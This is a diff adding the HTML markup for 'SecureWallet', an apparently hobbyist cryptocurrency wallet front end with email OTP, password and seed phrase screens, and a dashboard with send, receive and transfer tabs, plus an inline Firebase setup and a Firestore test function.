@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureWallet - Blockchain E-Wallet</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <!-- QRCode.js Library with fallback -->
+    <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js" 
+            onerror="this.onerror=null; this.src='https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.3/qrcode.min.js'"></script>
+
+</head>
+<body>
+    <div class="container">
+        
+        <!-- EMAIL VERIFICATION SCREEN -->
+        <div id="email-screen" class="screen active">
+            <div class="card">
+                <div class="header">
+                    <h1>🔐 SecureWallet</h1>
+                    <p>Your Gateway to Secure Digital Assets</p>
+                </div>
+
+                <!-- Security Features Section -->
+                <div class="security-features">
+                    <div class="feature-box">
+                        <div class="feature-icon">🛡️</div>
+                        <h4>Military-Grade Security</h4>
+                        <p>AES-256 + SHA-256 Protection</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon">💰</div>
+                        <h4>Multi-Currency Support</h4>
+                        <p>BTC, ETH, USDT & More</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon">🔐</div>
+                        <h4>Your Keys, Your Crypto</h4>
+                        <p>Non-custodial & Secure</p>
+                    </div>
+                </div>
+
+                <!-- Email Form -->
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" class="form-control" placeholder="Enter your email address" required>
+                    <div id="email-error" class="error-text hidden"></div>
+                </div>
+
+                <button type="button" id="send-otp-btn" class="btn btn-primary">
+                    Send OTP
+                </button>
+
+                <!-- Settings Button -->
+                <button type="button" id="settings-btn" class="btn btn-secondary mt-3">
+                    ⚙️ Settings
+                </button>
+
+                <!-- OTP Section -->
+                <div id="otp-section" class="hidden mt-4">
+                    <div class="form-group">
+                        <label>Enter 6-digit verification code</label>
+                        <div class="otp-inputs">
+                            <input type="text" class="otp-input" maxlength="1">
+                            <input type="text" class="otp-input" maxlength="1">
+                            <input type="text" class="otp-input" maxlength="1">
+                            <input type="text" class="otp-input" maxlength="1">
+                            <input type="text" class="otp-input" maxlength="1">
+                            <input type="text" class="otp-input" maxlength="1">
+                        </div>
+                        <div id="otp-error" class="error-text hidden"></div>
+                    </div>
+
+                    <button type="button" id="verify-otp-btn" class="btn btn-primary">
+                        Verify Email
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PASSWORD CREATION SCREEN -->
+        <div id="password-screen" class="screen">
+            <div class="card">
+                <div class="header">
+                    <h2>🔒 Create Your Secure Password</h2>
+                    <p>Create a strong password to protect your wallet</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="password-input-container">
+                        <input type="password" id="password" class="form-control" placeholder="Enter your password">
+                        <button type="button" id="password-toggle" class="password-toggle">
+                            <span class="eye-icon">👁️</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="password-strength">
+                    <div class="strength-bar">
+                        <div id="strength-fill" class="strength-fill"></div>
+                    </div>
+                    <span id="strength-text" class="strength-text">Enter password</span>
+                </div>
+
+                <div class="form-group">
+                    <label for="confirm-password">Confirm Password</label>
+                    <div class="password-input-container">
+                        <input type="password" id="confirm-password" class="form-control" placeholder="Confirm your password">
+                        <button type="button" id="confirm-password-toggle" class="password-toggle">
+                            <span class="eye-icon">👁️</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="password-requirements">
+                    <h4>Password Requirements:</h4>
+                    <div id="req-length" class="requirement">
+                        <span class="req-icon">❌</span> At least 8 characters
+                    </div>
+                    <div id="req-uppercase" class="requirement">
+                        <span class="req-icon">❌</span> One uppercase letter
+                    </div>
+                    <div id="req-lowercase" class="requirement">
+                        <span class="req-icon">❌</span> One lowercase letter
+                    </div>
+                    <div id="req-number" class="requirement">
+                        <span class="req-icon">❌</span> One number
+                    </div>
+                    <div id="req-special" class="requirement">
+                        <span class="req-icon">❌</span> One special character
+                    </div>
+                </div>
+
+                <div id="password-error" class="error-text hidden"></div>
+
+                <button type="button" id="continue-password-btn" class="btn btn-primary" disabled>
+                    Continue
+                </button>
+            </div>
+        </div>
+
+        <!-- SEED PHRASE SCREEN -->
+        <div id="seedphrase-screen" class="screen">
+            <div class="card">
+                <div class="header">
+                    <h2>🔑 Your Recovery Seed Phrase</h2>
+                    <p>Write down these 12 words in the exact order shown</p>
+                </div>
+
+                <!-- Security Warning -->
+                <div class="security-warning">
+                    <div class="warning-icon">⚠️</div>
+                    <div class="warning-content">
+                        <h4>🔒 Critical Security Information</h4>
+                        <ul>
+                            <li><strong>Never store online:</strong> Don't save in emails, cloud storage, or screenshots</li>
+                            <li><strong>Write on paper:</strong> Use a physical notebook and store it safely</li>
+                            <li><strong>Keep private:</strong> Never share your seed phrase with anyone</li>
+                            <li><strong>Multiple backups:</strong> Store copies in separate secure locations</li>
+                            <li><strong>Offline only:</strong> Write it down, don't type it anywhere digital</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div id="seed-words-display" class="seed-words-grid">
+                    <!-- Seed words will be generated here -->
+                </div>
+
+                <div class="seed-actions">
+                    <button type="button" id="regenerate-seed-btn" class="btn btn-secondary">
+                        🔄 Generate New
+                    </button>
+                    <button type="button" id="download-seed-btn" class="btn btn-secondary">
+                        💾 Download Backup
+                    </button>
+                </div>
+
+                <div class="form-group mt-4">
+                    <label for="seed-confirmation">Confirm your seed phrase by typing it below:</label>
+                    <textarea id="seed-confirmation" class="form-control" rows="3" 
+                              placeholder="Type your 12-word seed phrase here (separated by spaces)"></textarea>
+                    <div id="seed-error" class="error-text hidden"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="seed-saved-checkbox">
+                        <span class="checkmark"></span>
+                        I have safely written down my seed phrase on paper
+                    </label>
+                </div>
+
+                <button type="button" id="access-wallet-btn" class="btn btn-primary" disabled>
+                    Access My Wallet
+                </button>
+            </div>
+        </div>
+
+        <!-- WALLET DASHBOARD SCREEN -->
+        <div id="dashboard-screen" class="screen">
+            <div class="dashboard-container">
+                <!-- Header -->
+                <div class="dashboard-header">
+                    <div class="wallet-info">
+                        <h2>🔐 SecureWallet</h2>
+                        <div class="user-info">
+                            <span id="user-email-display"></span>
+                            <button id="logout-btn" class="btn-icon" title="Logout">🚪</button>
+                        </div>
+                    </div>
+                    <div class="wallet-address">
+                        <span id="wallet-address-display"></span>
+                        <button id="copy-address-btn" class="btn-icon" title="Copy Address">📋</button>
+                    </div>
+                </div>
+
+                <!-- Balance Overview -->
+                <div class="balance-section">
+                    <div class="total-balance">
+                        <h3>Total Balance</h3>
+                        <div id="total-balance" class="balance-amount">$0.00</div>
+                    </div>
+                    <div class="crypto-balances">
+                        <div class="crypto-item">
+                            <div class="crypto-icon">₿</div>
+                            <div class="crypto-info">
+                                <div id="btc-amount" class="crypto-amount">0.00000000 BTC</div>
+                                <div id="btc-value" class="crypto-value">$0.00</div>
+                            </div>
+                        </div>
+                        <div class="crypto-item">
+                            <div class="crypto-icon">Ξ</div>
+                            <div class="crypto-info">
+                                <div id="eth-amount" class="crypto-amount">0.00000000 ETH</div>
+                                <div id="eth-value" class="crypto-value">$0.00</div>
+                            </div>
+                        </div>
+                        <div class="crypto-item">
+                            <div class="crypto-icon">₮</div>
+                            <div class="crypto-info">
+                                <div id="usdt-amount" class="crypto-amount">0.00 USDT</div>
+                                <div id="usdt-value" class="crypto-value">$0.00</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Actions -->
+                <div class="quick-actions">
+                    <button class="action-btn" data-action="send">
+                        <div class="action-icon">📤</div>
+                        <span>Send</span>
+                    </button>
+                    <button class="action-btn" data-action="receive">
+                        <div class="action-icon">📥</div>
+                        <span>Receive</span>
+                    </button>
+                    <button class="action-btn" data-action="scan">
+                        <div class="action-icon">📱</div>
+                        <span>Scan</span>
+                    </button>
+                </div>
+
+                <!-- Tab Navigation -->
+                <div class="tab-navigation">
+                    <button class="tab-btn active" data-tab="overview">Overview</button>
+                    <button class="tab-btn" data-tab="send">Send</button>
+                    <button class="tab-btn" data-tab="receive">Receive</button>
+                    <button class="tab-btn" data-tab="transfer">Transfer</button>
+                    <button class="tab-btn" data-tab="history">History</button>
+                </div>
+
+                <!-- Tab Content -->
+                <div class="tab-content">
+                    
+                    <!-- OVERVIEW TAB -->
+                    <div id="overview-tab" class="tab-pane active">
+                        <div class="overview-content">
+                            <h3>Recent Transactions</h3>
+                            <div id="recent-transactions-list" class="transactions-list">
+                                <!-- Recent transactions will be populated here -->
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- SEND TAB -->
+                    <div id="send-tab" class="tab-pane">
+                        <h3>Send Cryptocurrency</h3>
+                        
+                        <div class="form-group">
+                            <label for="send-currency">Select Currency</label>
+                            <select id="send-currency" class="form-control">
+                                <option value="BTC">Bitcoin (BTC)</option>
+                                <option value="ETH">Ethereum (ETH)</option>
+                                <option value="USDT">Tether (USDT)</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="send-address">Recipient Address</label>
+                            <input type="text" id="send-address" class="form-control" 
+                                   placeholder="Enter wallet address">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="send-amount">Amount</label>
+                            <input type="number" id="send-amount" class="form-control" 
+                                   placeholder="0.00" step="0.00000001" min="0">
+                        </div>
+
+                        <div id="send-summary" class="send-summary" style="display: none;">
+                            <!-- Transaction summary will be populated here -->
+                        </div>
+
+                        <button id="send-payment-btn" class="btn btn-primary">
+                            Send Payment
+                        </button>
+                    </div>
+
+                    <!-- RECEIVE TAB -->
+                    <div id="receive-tab" class="tab-pane">
+                        <h3>Receive Cryptocurrency</h3>
+                        
+                        <div class="form-group">
+                            <label for="request-currency">Select Currency</label>
+                            <select id="request-currency" class="form-control">
+                                <option value="BTC">Bitcoin (BTC)</option>
+                                <option value="ETH">Ethereum (ETH)</option>
+                                <option value="USDT">Tether (USDT)</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="request-amount">Amount (Optional)</label>
+                            <input type="number" id="request-amount" class="form-control" 
+                                   placeholder="0.00" step="0.00000001" min="0">
+                        </div>
+
+                        <div class="qr-section">
+                            <div class="qr-container">
+                                <canvas id="receive-qr-canvas"></canvas>
+                                <div id="qr-error" class="error-text hidden"></div>
+                            </div>
+                            
+                            <div class="qr-actions">
+                                <button id="generate-payment-qr-btn" class="btn btn-secondary">
+                                    Generate Payment QR
+                                </button>
+                                <button id="download-qr-btn" class="btn btn-secondary">
+                                    Download QR
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="receive-address">Your Wallet Address</label>
+                            <div class="address-input-container">
+                                <input type="text" id="receive-address" class="form-control" readonly>
+                                <button id="copy-receive-address-btn" class="btn btn-secondary">
+                                    Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- TRANSFER TAB -->
+                    <div id="transfer-tab" class="tab-pane">
+                        <h3>Internal Transfer</h3>
+                        
+                        <div class="form-group">
+                            <label for="transfer-from">From Account</label>
+                            <select id="transfer-from" class="form-control">
+                                <option value="main">Main Wallet</option>
+                                <option value="savings">Savings</option>
+                                <option value="trading">Trading</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="transfer-to">To Account</label>
+                            <select id="transfer-to" class="form-control">
+                                <option value="savings">Savings</option>
+                                <option value="trading">Trading</option>
+                                <option value="main">Main Wallet</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="transfer-currency">Currency</label>
+                            <select id="transfer-currency" class="form-control">
+                                <option value="BTC">Bitcoin (BTC)</option>
+                                <option value="ETH">Ethereum (ETH)</option>
+                                <option value="USDT">Tether (USDT)</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="transfer-amount">Amount</label>
+                            <input type="number" id="transfer-amount" class="form-control" 
+                                   placeholder="0.00" step="0.00000001" min="0">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="transfer-note">Note (Optional)</label>
+                            <input type="text" id="transfer-note" class="form-control" 
+                                   placeholder="Transfer note...">
+                        </div>
+
+                        <button id="confirm-transfer-btn" class="btn btn-primary">
+                            Confirm Transfer
+                        </button>
+                    </div>
+
+                    <!-- HISTORY TAB -->
+                    <div id="history-tab" class="tab-pane">
+                        <div class="history-header">
+                            <h3>Transaction History</h3>
+                            <div class="history-filters">
+                                <select id="history-filter" class="form-control">
+                                    <option value="all">All Transactions</option>
+                                    <option value="sent">Sent</option>
+                                    <option value="received">Received</option>
+                                    <option value="transfer">Transfers</option>
+                                </select>
+                                <input type="text" id="history-search" class="form-control" 
+                                       placeholder="Search transactions...">
+                            </div>
+                        </div>
+                        
+                        <div id="transaction-history-list" class="transactions-list">
+                            <!-- Transaction history will be populated here -->
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Load JavaScript -->
+    <script src="app.js"></script>
+    <!-- All your wallet HTML above -->
+    
+    <script src="app.js"></script>
+    <script>
+      console.log("Testing regular script...");
+      window.testBasic = "Regular scripts work!";
+      console.log("Basic test complete");
+    </script>
+    <!-- Firebase v8 SDK (works with regular scripts) -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
+<script>
+  console.log("🔥 Loading Firebase v8...");
+  
+  const firebaseConfig = {
+    apiKey: "AIzaSyD0U3BxRUpNUI6cHQX7RJQ5KDu9R1AaJA",
+    authDomain: "wallet-742b9.firebaseapp.com",
+    projectId: "wallet-742b9",
+    storageBucket: "wallet-742b9.firebasestorage.app",
+    messagingSenderId: "962945593813",
+    appId: "1:962945593813:web:407c19766f53b52e010d5c"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  window.firebaseDB = firebase.firestore();
+  
+  console.log("✅ Firebase v8 loaded successfully!", window.firebaseDB);
+  
+  // Test function
+  window.testSave = async () => {
+    try {
+      await window.firebaseDB.collection("test").doc("hello").set({
+        message: "Hello World!",
+        timestamp: new Date().toISOString()
+      });
+      console.log("✅ Test save successful!");
+      alert("Firebase test successful! Check your Firestore console.");
+    } catch (error) {
+      console.error("❌ Test save failed:", error);
+      alert("Test failed: " + error.message);
+    }
+  };
+</script>
+</body>
+</html>
+
+</script>
+</script>
+</body>
+</html>
+
